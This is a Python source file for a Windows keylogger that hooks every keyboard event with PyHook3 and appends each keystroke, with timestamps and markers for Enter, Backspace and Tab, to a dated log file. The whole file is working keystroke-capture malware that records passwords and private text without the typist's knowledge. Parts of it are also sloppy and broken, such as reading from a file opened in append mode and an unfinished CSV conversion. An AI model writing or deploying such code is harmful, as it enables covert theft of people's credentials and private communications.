import PyHook3
import pythoncom
import  PySimpleGUI as sg
from datetime import datetime
import  json
import csv


datelogname = datetime.today().strftime('%m-%d-%Y')  # to be used for naming the log with the date in it.
datetimestamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')  # to be used for timestamping the date and time the keys were pressed


# Define a new function for the keylogger

# sg.Popup('Hello from pysimple!', ' This is the shortest GUI program ever!')

def GiveSpaceAtTheEnd():  # this will open the file and make the first line start with the timestamp next to it.  Ensures it starts with a datetimestamp on the first line at start.
    logfile = open(datelogname + "logfile.txt", 'a+')
    logfile.write("\n" + datetimestamp + " || " ) # Adds a new line. Enters the current date and time next to it. Plus, it add's the Delimiter.
    logfile.close() # closes the log file


GiveSpaceAtTheEnd() # runs the fucntion
def OnKeyboardEvent(event):
    logfile = open( datelogname + 'logfile.txt', 'a+')   # open the file  in append mode. If the file does not exist, then create the file and open it in append mode.
    buffers = logfile.read()  # buffers is set to open the file and read what is  in it.
    logfile.close()  # closes the log file.

    # open the file to write the current new keystrokes.

    logfile = open(datelogname + "logfile.txt", 'a+')  # open the file  in append mode. If the file does not exist, then create the file and open it in append mode.
    #windowname = event.WindowName  # prints out the name of the current window being typed in.
    keylogs = chr(event.Ascii)  # keylogs is whatever is being typed.

    # print("Ascii value is: ", str(event.Ascii))
    # print("current window being typed in " + windowname)

    if event.Ascii == 13:  # if entered is pressed, then start a new line and add the current date and time next to it. Plus, add the Delimiter.
        keylogs = '\n' + datetimestamp + " || " + " "

    if event.Ascii == 8:  # if backspace is used, then convert it to the word, back space. This is done to prevent it from showing up as a box.
        keylogs =' <Backspace> '

    if event.Ascii == 9:
        keylogs =' <Tab> '

    logfilelist = []  # this will be used to transfer the content of the logfile to a cvs logfile.



    buffers += keylogs   # Whatever is keylogs equal to, Gets added to the buffers variable.

    logfile.write(buffers)  # writes the key pressed  to the file



    logfile.close()   # closes the file

    logfile = open(datelogname + 'logfile.txt', 'r')
    logfilelist = [line.split('||') for line in logfile.read()]


    return True


hm = PyHook3.HookManager()
hm.KeyDown = OnKeyboardEvent   # watch for all keyboard events
hm.HookKeyboard()


pythoncom.PumpMessages()




